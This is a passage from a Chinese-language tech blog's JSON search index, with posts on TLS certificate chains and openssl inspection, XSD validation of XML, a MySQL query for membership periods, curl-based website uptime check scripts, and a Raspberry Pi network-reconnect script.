intermediate2.pem</span><br></pre></td></tr></table></figure>\n<p><strong>2020-07-22</strong><br>最後這篇有和我同學討論<br><img src=\"https://malagege.github.io/blog/2020/07/14/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/cgh.png\" alt=\"\"><br>我認為跟用同一個私金鑰產生有關係<br>他認為公鑰解析出來應該跟 pin sha256 一樣有關係 (當時看圖片沒注意到)<br>不過我們加密學都不是很懂，這邊就不繼續研究了</p>\n<p>至於抓兩個路徑<br>我目前猜測四層憑證第二層對應上去都是 TWCA Global Root CA<br>除了中繼憑證跟電腦跟憑證 Mapping 到名子對應上去剛好符合驗證解密內容<br>四層憑證在 Windows 看是四層，但用在 Firefox,Linux(Chrome),Android(Chrome) 來看竟然是抓到三層</p>\n<p>總結心得<br>當出現網站不安全，都是無法串連(client)<strong>根憑證</strong>有關係<br>根憑證正確就往下追中繼憑證，中繼憑證順序都需要注意<br>中繼憑證可以不用附根憑證(畢竟裝置有根憑證，沒必要再傳送過去)<br>但我這個案例比較特別，正常應該不會遇到<br>裝置有兩個 TWCA 根憑證，正常應該不會遇到問題<br>就算裝置有三層根憑證，也通吃<br>但是裝置只有四層根憑證，就會出現不安全!!!(像 LINE Webhook 就沒有 TWCA 三層憑證)<br>不過還是看到滿多網站都掛四層憑證居多<br>可以到很多銀行、醫院網站看看憑證</p>\n<p>把 apache 設定 endentity.pem 對應 intermediate2.pem 真得可以用</p>\n<h2 id=\"測試檔案\"><a href=\"#測試檔案\" class=\"headerlink\" title=\"測試檔案\"></a>測試檔案</h2><a href=\"/blog/2020/07/18/產生自簽憑證筆記/test_cert.7z\" title=\"所有範例下載\">所有範例下載</a>\n<p>/vagrant/ &lt;====== 第一段建立憑證範例<br>/vagrant/test/ &lt;====== 第二、三段建立中繼、萬用憑證範例<br>   hosts 參考 dns 設定檔<br>   default-ssl.conf apache 設定檔</p>\n<h2 id=\"查看-web-上驗憑證內容\"><a href=\"#查看-web-上驗憑證內容\" class=\"headerlink\" title=\"查看 web 上驗憑證內容\"></a>查看 web 上驗憑證內容</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl s_client  -connect localhost.com:443 &lt;/dev/null  |  openssl x509 -noout -text  | less</span><br><span class=\"line\"></span><br><span class=\"line\">openssl s_client  -connect youtube.com:443 &lt;/dev/null  |  openssl x509 -noout -text  | less</span><br></pre></td></tr></table></figure>\n<h2 id=\"其他資源\"><a href=\"#其他資源\" class=\"headerlink\" title=\"其他資源\"></a>其他資源</h2><ul>\n<li><p><a href=\"https://dotblogs.com.tw/grayyin/2019/05/04/143637\" target=\"_blank\" rel=\"noopener\">Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落</a></p>\n</li>\n<li><p><a href=\"https://code.yidas.com/tls-ssl-certificate-guide/\" target=\"_blank\" rel=\"noopener\">[Server] TLS/SSL憑證(Certificate)常用指令 – 製作CSR – YIDAS Code</a></p>\n</li>\n<li><p><a href=\"https://xenby.com/b/205-%E6%8E%A8%E8%96%A6-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AB%AF%E9%96%8B%E7%99%BC%E7%94%A8ssl%E6%86%91%E8%AD%89%E5%B7%A5%E5%85%B7-mkcert\" target=\"_blank\" rel=\"noopener\">[推薦] 快速產生本地端開發用SSL憑證工具-mkcert | 辛比誌</a></p>\n</li>\n<li><p><a href=\"https://blog.pichuang.com.tw/20200204-homelcloud-high-level-design-5/\" target=\"_blank\" rel=\"noopener\">2020 大改造宅宅雲架構系列文-5 窮人版 PKI - Phil Workspace</a> <a href=\"/blog/2020/07/18/產生自簽憑證筆記/web2.png\" title=\"備份圖\">備份圖</a><br>裡面有提到 CRL</p>\n</li>\n<li><p><a href=\"https://raix852.github.io/2016/06/20/use-openssl-generate-certificate/\" target=\"_blank\" rel=\"noopener\">使用 Openssl 建立憑證 | Raix’s Blog</a> <a href=\"/blog/2020/07/18/產生自簽憑證筆記/web3.png\" title=\"備份圖\">備份圖</a><br>這邊也有提到 CRL</p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/charlieroro/p/10948173.html\" target=\"_blank\" rel=\"noopener\">rfc 5280 X.509 PKI 解析 - charlieroro - 博客园</a></p>\n</li>\n</ul>\n","categories":["Linux"],"tags":["cert"]},{"title":"用 XSD 驗證 XML 方法","url":"/blog/2021/02/02/%E7%94%A8-XSD-%E9%A9%97%E8%AD%89-XML-%E6%96%B9%E6%B3%95/","content":"<p>維運常常遇到 XML 裡面格式<br>規則不是很清楚<br>後來</p>\n<a id=\"more\"></a>\n<h2 id=\"Notepad\"><a href=\"#Notepad\" class=\"headerlink\" title=\"Notepad++\"></a>Notepad++</h2><p>簡單好用!!目前最推薦這個方法</p>\n<p><a href=\"https://www.youtube.com/watch?app=desktop&amp;v=hvIKAD1vMCo\" target=\"_blank\" rel=\"noopener\">Validate XML with XSD in Notepad++ - YouTube</a></p>\n<h2 id=\"VScode\"><a href=\"#VScode\" class=\"headerlink\" title=\"VScode\"></a>VScode</h2><p><a href=\"https://marketplace.visualstudio.com/items?itemName=redhat.vscode-xml\" target=\"_blank\" rel=\"noopener\">XML - Visual Studio Marketplace</a></p>\n<p>要特別安裝Java 才能用</p>\n<h2 id=\"維運做的案例\"><a href=\"#維運做的案例\" class=\"headerlink\" title=\"維運做的案例\"></a>維運做的案例</h2><h3 id=\"找到-XSD\"><a href=\"#找到-XSD\" class=\"headerlink\" title=\"找到 XSD\"></a>找到 XSD</h3><p><a href=\"https://richpercussion.blogspot.com/2017/10/c.html\" target=\"_blank\" rel=\"noopener\">瑞曲之聲: C# 簡易電子發票資料Turnkey交換範例</a><br><a href=\"https://github.com/RichieHsu/ENVITest/issues/1\" target=\"_blank\" rel=\"noopener\">不好意思，因為沒聯絡方式，所以只好在這邊留言詢問 · Issue #1 · RichieHsu/ENVITest</a><br><a href=\"https://github.com/RichieHsu/ENVITest/tree/master/CSharp/ENVITest/EInvoiceXSD/v31\" target=\"_blank\" rel=\"noopener\">ENVITest/CSharp/ENVITest/EInvoiceXSD/v31 at master · RichieHsu/ENVITest</a></p>\n"},{"title":"用MySQL抓多列取起始時間與結束時間用法","url":"/blog/2018/05/25/%E7%94%A8MySQL%E6%8A%93%E5%A4%9A%E6%AC%84%E5%8F%96%E8%B5%B7%E5%A7%8B%E6%99%82%E9%96%93%E8%88%87%E7%B5%90%E6%9D%9F%E6%99%82%E9%96%93%E7%94%A8%E6%B3%95/","content":"<p>最近有專案要做，舊有的table記錄會員展期時間都在不同列<br>但是同時抓不同列的頭尾，要怎麼抓聽<br>前一間公司有做過切帳，但是…那時候切帳有頭尾分開<br>這次是連在一起<br>同尾跟上一個不連續代表有展期是分開的<br>就想想這張table有什麼方法可以做到<br><a id=\"more\"></a></p>\n<p>想了一連串方法<br>用union all把starttime和endtime欄位串起來<br>做<code>count()</code>做數量加總<br>having過濾需要長度1的<br>代表</p>\n<ul>\n<li>基數行是展期開頭</li>\n<li>偶數行是展期結束</li>\n</ul>\n<p>網路爬了一下MySQL要怎麼做Rank<br><a href=\"https://blog.csdn.net/tjuyanming/article/details/77825875\" target=\"_blank\" rel=\"noopener\">[数据库与SQL] - No.5 MYSQL实现 RANK函数排序功能 - CSDN博客</a><br><a href=\"https://ithelp.ithome.com.tw/questions/10069933\" target=\"_blank\" rel=\"noopener\">MySQL 求名次的問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p>接下來序列都做好了，<br>原本想用1,0,1,0來做續接的方法<br>但是都失敗了</p>\n<p>不過最後想到一個方式串接<br>最近看「SQL語法範例辭典」P.516 Between ,一個資料表當做不同資料表<br>實例都還滿有趣的<br>這個跟上一間切帳有種同工之妙</p>\n<p>最後可以在用user跟這張表用between串起來…<br>不過用這個東西SQL可能特別長….</p>\n<p><code>where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1;</code><br>aa.rank+1 = bb.rank<br>rank對2對3，我一直記錯<br>(2) + 1 = 3 </p>\n<p>把偶數行用消失，就rank % 2 = 1就好了</p>\n<p>最後怕效能，所以在MySQL索引加入uid為index<br>但是竟然還是full scan<br><del>這又是另外一個故事了XD</del><br>最後用join方式解決出問題(解法跟上次MySQL IN解決方法差不多)<br>有空再開筆記</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> test_tb</span><br><span class=\"line\">(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">int</span> auto_increment</span><br><span class=\"line\">\t\tprimary <span class=\"keyword\">key</span>,</span><br><span class=\"line\">\tuid <span class=\"built_in\">varchar</span>(<span class=\"number\">10</span>) <span class=\"literal\">null</span>,</span><br><span class=\"line\">\tstarttime <span class=\"built_in\">int</span> <span class=\"literal\">null</span>,</span><br><span class=\"line\">\tendtime <span class=\"built_in\">int</span> <span class=\"literal\">null</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">comment</span> <span class=\"string\">'test'</span></span><br><span class=\"line\">;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">index</span> test_tb_uid_index</span><br><span class=\"line\">\t<span class=\"keyword\">on</span> test_tb (uid)</span><br><span class=\"line\">;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- TRUNCATE  test_tb;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'a'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-01-01'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-02-02'</span>));</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'a'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-02-02'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-03-01'</span>));</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'a'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-04-01'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-07-01'</span>));</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'a'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-07-01'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-09-01'</span>));</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'b'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-01-01'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-02-01'</span>));</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'b'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-03-01'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-04-01'</span>));</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span>  test_tb(uid,starttime,endtime)<span class=\"keyword\">VALUES</span> (<span class=\"string\">'b'</span>,<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-04-01'</span>),<span class=\"keyword\">unix_timestamp</span>(<span class=\"string\">'2013-05-01'</span>));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- query</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> test_tb;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> *</span><br><span class=\"line\"><span class=\"keyword\">FROM</span></span><br><span class=\"line\">(</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> @<span class=\"keyword\">rownum</span> := @<span class=\"keyword\">rownum</span>+<span class=\"number\">1</span> <span class=\"keyword\">AS</span> <span class=\"string\">'Rank'</span>, t</span><br><span class=\"line\"> <span class=\"keyword\">FROM</span></span><br><span class=\"line\">   (<span class=\"keyword\">SELECT</span> from_unixtime(<span class=\"keyword\">time</span>) t</span><br><span class=\"line\">    <span class=\"keyword\">FROM</span></span><br><span class=\"line\">      (</span><br><span class=\"line\">        <span class=\"keyword\">select</span> starttime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">        <span class=\"keyword\">from</span> test_tb</span><br><span class=\"line\">        <span class=\"keyword\">WHERE</span> uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">        <span class=\"keyword\">union</span> ALL</span><br><span class=\"line\">        <span class=\"keyword\">SELECT</span> endtime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">        <span class=\"keyword\">FROM</span> test_tb</span><br><span class=\"line\">        <span class=\"keyword\">where</span> uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">      )  a</span><br><span class=\"line\">    <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> <span class=\"keyword\">time</span></span><br><span class=\"line\">    <span class=\"keyword\">HAVING</span>  <span class=\"keyword\">count</span>(<span class=\"number\">1</span>) = <span class=\"number\">1</span></span><br><span class=\"line\">   ) a, (<span class=\"keyword\">SELECT</span> @<span class=\"keyword\">rownum</span> := <span class=\"number\">0</span>) r</span><br><span class=\"line\">) aa,(</span><br><span class=\"line\">       <span class=\"keyword\">SELECT</span> @rownum1 := @rownum1+<span class=\"number\">1</span> <span class=\"keyword\">AS</span> <span class=\"string\">'Rank'</span>, t</span><br><span class=\"line\">       <span class=\"keyword\">FROM</span></span><br><span class=\"line\">         (<span class=\"keyword\">SELECT</span> from_unixtime(<span class=\"keyword\">time</span>) t</span><br><span class=\"line\">          <span class=\"keyword\">FROM</span></span><br><span class=\"line\">            (</span><br><span class=\"line\">              <span class=\"keyword\">select</span> starttime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">              <span class=\"keyword\">from</span> test_tb</span><br><span class=\"line\">              <span class=\"keyword\">WHERE</span> uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">              <span class=\"keyword\">union</span> ALL</span><br><span class=\"line\">              <span class=\"keyword\">SELECT</span> endtime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">              <span class=\"keyword\">FROM</span> test_tb</span><br><span class=\"line\">              <span class=\"keyword\">where</span> uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">            )  a</span><br><span class=\"line\">          <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> <span class=\"keyword\">time</span></span><br><span class=\"line\">          <span class=\"keyword\">HAVING</span>  <span class=\"keyword\">count</span>(<span class=\"number\">1</span>) = <span class=\"number\">1</span></span><br><span class=\"line\">         ) a, (<span class=\"keyword\">SELECT</span> @rownum1 := <span class=\"number\">0</span>) r</span><br><span class=\"line\">     ) bb</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">where</span> aa.rank+<span class=\"number\">1</span> = bb.Rank <span class=\"keyword\">AND</span> aa.Rank%<span class=\"number\">2</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">EXPLAIN</span>  <span class=\"keyword\">SELECT</span> *</span><br><span class=\"line\"><span class=\"keyword\">FROM</span></span><br><span class=\"line\">(</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> @<span class=\"keyword\">rownum</span> := @<span class=\"keyword\">rownum</span>+<span class=\"number\">1</span> <span class=\"keyword\">AS</span> <span class=\"string\">'Rank'</span>, t</span><br><span class=\"line\"> <span class=\"keyword\">FROM</span></span><br><span class=\"line\">   (<span class=\"keyword\">SELECT</span> from_unixtime(<span class=\"keyword\">time</span>) t</span><br><span class=\"line\">    <span class=\"keyword\">FROM</span></span><br><span class=\"line\">      (</span><br><span class=\"line\">        <span class=\"keyword\">select</span> i.starttime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">        <span class=\"keyword\">from</span> test_tb i <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> test_tb ii</span><br><span class=\"line\">        <span class=\"keyword\">WHERE</span> ii.uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">        <span class=\"keyword\">union</span> ALL</span><br><span class=\"line\">        <span class=\"keyword\">SELECT</span> i.endtime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">        <span class=\"keyword\">FROM</span> test_tb i <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> test_tb ii</span><br><span class=\"line\">        <span class=\"keyword\">where</span> ii.uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">      )  a</span><br><span class=\"line\">    <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> <span class=\"keyword\">time</span></span><br><span class=\"line\">    <span class=\"keyword\">HAVING</span>  <span class=\"keyword\">count</span>(<span class=\"number\">1</span>) = <span class=\"number\">1</span></span><br><span class=\"line\">   ) a, (<span class=\"keyword\">SELECT</span> @<span class=\"keyword\">rownum</span> := <span class=\"number\">0</span>) r</span><br><span class=\"line\">) aa,(</span><br><span class=\"line\">       <span class=\"keyword\">SELECT</span> @rownum1 := @rownum1+<span class=\"number\">1</span> <span class=\"keyword\">AS</span> <span class=\"string\">'Rank'</span>, t</span><br><span class=\"line\">       <span class=\"keyword\">FROM</span></span><br><span class=\"line\">         (<span class=\"keyword\">SELECT</span> from_unixtime(<span class=\"keyword\">time</span>) t</span><br><span class=\"line\">          <span class=\"keyword\">FROM</span></span><br><span class=\"line\">            (</span><br><span class=\"line\">              <span class=\"keyword\">select</span> i.starttime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">              <span class=\"keyword\">from</span> test_tb i <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> test_tb ii</span><br><span class=\"line\">              <span class=\"keyword\">WHERE</span> ii.uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">              <span class=\"keyword\">union</span> ALL</span><br><span class=\"line\">              <span class=\"keyword\">SELECT</span> i.endtime <span class=\"keyword\">as</span> <span class=\"string\">'time'</span></span><br><span class=\"line\">              <span class=\"keyword\">FROM</span> test_tb i <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> test_tb ii</span><br><span class=\"line\">              <span class=\"keyword\">where</span> ii.uid = <span class=\"string\">'a'</span></span><br><span class=\"line\">            )  a</span><br><span class=\"line\">          <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> <span class=\"keyword\">time</span></span><br><span class=\"line\">          <span class=\"keyword\">HAVING</span>  <span class=\"keyword\">count</span>(<span class=\"number\">1</span>) = <span class=\"number\">1</span></span><br><span class=\"line\">         ) a, (<span class=\"keyword\">SELECT</span> @rownum1 := <span class=\"number\">0</span>) r</span><br><span class=\"line\">     ) bb</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">where</span> aa.rank+<span class=\"number\">1</span> = bb.Rank <span class=\"keyword\">AND</span> aa.Rank%<span class=\"number\">2</span> = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://sqlfiddle.com/#!9/eb812b/3\" target=\"_blank\" rel=\"noopener\">SQL Fiddle</a></p>\n","categories":["MySQL"],"tags":["sql","MySQL"]},{"title":"監控多個網頁腳本(Shell)","url":"/blog/2020/07/15/%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell/","content":"<p>最近專案 Server 特別多…<br>所以在想有什麼腳本可以快速確認服務正常<br>又爬文整理一下<br>主要是參考這篇 <a href=\"https://www.2daygeek.com/linux-command-check-website-is-up-down-alive/\" target=\"_blank\" rel=\"noopener\">6 Methods to Quickly Check if a Website is up or down from the Linux Terminal | 2daygeek.com</a></p>\n<a id=\"more\"></a>\n<p>主要參考<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vi curl-url-check-1.sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> site <span class=\"keyword\">in</span> www.google.com google.co.in www.xyzzz.com</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> curl -I <span class=\"string\">\"<span class=\"variable\">$site</span>\"</span> 2&gt;&amp;1 | grep -w <span class=\"string\">\"200\\|301\"</span> ; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$site</span> is up\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$site</span> is down\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"----------------------------------\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure></p>\n<p>最後只需要<code># sh curl-url-check-1.sh</code><br>就能測試了</p>\n<h2 id=\"我簡單修改\"><a href=\"#我簡單修改\" class=\"headerlink\" title=\"我簡單修改\"></a>我簡單修改</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">url_list=(</span><br><span class=\"line\"><span class=\"comment\"># web</span></span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\"><span class=\"comment\"># api</span></span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> site <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$&#123;url_list[@]&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> curl -k -i <span class=\"string\">\"<span class=\"variable\">$site</span>\"</span> 2&gt;&amp;1 | grep -w <span class=\"string\">\"200\\|301\"</span> ; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$site</span> is up\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$site</span> is down\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"----------------------------------\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"加入顏色\"><a href=\"#加入顏色\" class=\"headerlink\" title=\"加入顏色\"></a>加入顏色</h2><p>太多了，眼睛看的不是很舒服</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">COLOR_REST=<span class=\"string\">'\\e[0m'</span>;</span><br><span class=\"line\">COLOR_GREEN=<span class=\"string\">'\\e[0;32m'</span>;</span><br><span class=\"line\">COLOR_RED=<span class=\"string\">'\\e[0;31m'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">url_list=(</span><br><span class=\"line\"><span class=\"comment\"># WEB</span></span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\"><span class=\"comment\"># API</span></span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">https://***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\">http://1***.jsp</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> site <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$&#123;url_list[@]&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> curl -k -i <span class=\"string\">\"<span class=\"variable\">$site</span>\"</span> 2&gt;&amp;1 | grep -w <span class=\"string\">\"200\\|301\"</span> ; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> -e <span class=\"string\">\"<span class=\"variable\">$site</span> is <span class=\"variable\">$&#123;COLOR_GREEN&#125;</span>up<span class=\"variable\">$&#123;COLOR_REST&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> -e <span class=\"string\">\"<span class=\"variable\">$site</span> is <span class=\"variable\">$&#123;COLOR_RED&#125;</span>down<span class=\"variable\">$&#123;COLOR_REST&#125;</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"----------------------------------\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>完成，愉悅 XD</p>\n<p><a href=\"https://www.2daygeek.com/linux-command-check-website-is-up-down-alive/\" target=\"_blank\" rel=\"noopener\">6 Methods to Quickly Check if a Website is up or down from the Linux Terminal | 2daygeek.com</a><br>裡面還有fping<br>但好像無法對單一網址<br>所以就沒繼續研究</p>\n","categories":["Linux"],"tags":["shell","web"]},{"title":"監控電腦活著發送 DISCORD 通知","url":"/blog/2020/06/27/%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5/","content":"<p>最近 Raspberry Pi 三號機網路常常掛點<br>雖然之前有找到讓它重新開機的方法<br><a href=\"https://malagege.github.io/blog/2019/01/27/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%EF%BC%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/\">Linux在Wifi使用pppoe連線後，重開機不能連線上網 | 程式狂想筆記</a><br>但我沒採用這個方案<br>畢竟有時候需要確保有哪些程式正在執行<br>再重開機是比較好的</p>\n<a id=\"more\"></a>\n<h2 id=\"有問題電腦解決重新連線方法\"><a href=\"#有問題電腦解決重新連線方法\" class=\"headerlink\" title=\"有問題電腦解決重新連線方法\"></a>有問題電腦解決重新連線方法</h2><p>最近看到<a href=\"https://www.raspberrypi.org/forums/viewtopic.php?t=19971\" target=\"_blank\" rel=\"noopener\">Headless raspberryPi with eth0+USB issue Register 0x00000114 - Raspberry Pi Forums</a><br>這邊會 ping 自己的路由<br>失敗會重啟 Interface</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># cron script for checking wlan connectivity</span></span><br><span class=\"line\">IP_FOR_TEST=<span class=\"string\">\"192.168.1.1\"</span></span><br><span class=\"line\">PING_COUNT=1</span><br><span class=\"line\"></span><br><span class=\"line\">PING=<span class=\"string\">\"/bin/ping\"</span></span><br><span class=\"line\">IFUP=<span class=\"string\">\"/sbin/ifup\"</span></span><br><span class=\"line\">IFDOWN=<span class=\"string\">\"/sbin/ifdown --force\"</span></span><br><span class=\"line\">INTERFACE=<span class=\"string\">\"eth0\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">FFLAG=<span class=\"string\">\"/opt/check_lan/stuck.fflg\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ping test</span></span><br><span class=\"line\"><span class=\"variable\">$PING</span> -c <span class=\"variable\">$PING_COUNT</span> <span class=\"variable\">$IP_FOR_TEST</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ $? -ge 1 ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    logger <span class=\"string\">\"<span class=\"variable\">$INTERFACE</span> seems to be 